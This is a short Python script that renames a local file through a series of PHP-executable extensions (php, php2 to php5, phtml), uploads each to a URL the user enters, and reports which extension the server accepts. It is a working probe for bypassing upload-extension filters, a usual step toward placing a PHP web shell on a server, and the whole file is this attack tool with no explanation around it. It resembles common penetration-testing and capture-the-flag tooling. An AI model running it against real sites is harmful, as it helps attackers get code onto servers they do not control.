#!/bin/python3

import requests,os

oldfilename = input('Old FILE NAME : ')
filename = input('new filename $ ')
url = input('URL $ ')
extensions = [
    'php',
    'php2',
    'php3',
    'php4',
    'php5',
    'phtml',
]

for ext in extensions:
    new_filename = filename + '.' + ext
    os.rename(oldfilename,new_filename)
    file = {'file':open(new_filename,'rb')}
    response = requests.post(url, files=file)
    if 'Extension not allowed' in response.text:
        print('Extension not allowed')
    else:
        print(f'{ext} is allowed')
    oldfilename = new_filename

